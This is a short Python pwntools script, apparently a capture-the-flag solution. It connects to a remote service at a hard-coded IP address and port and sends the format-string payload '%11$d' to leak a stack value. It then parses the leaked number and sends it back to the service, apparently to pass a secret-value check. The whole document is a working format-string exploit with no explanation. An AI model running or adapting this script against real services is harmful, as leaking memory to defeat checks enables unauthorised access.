from pwn import *



p=remote("3.92.136.78",5003)
payload=""
payload+="%11$d"
p.recv()
p.sendline(payload)
a=p.recv()
print a
ans=int(a,10)

p.sendline(str(ans))
print a
print p.recv()
print p.recv()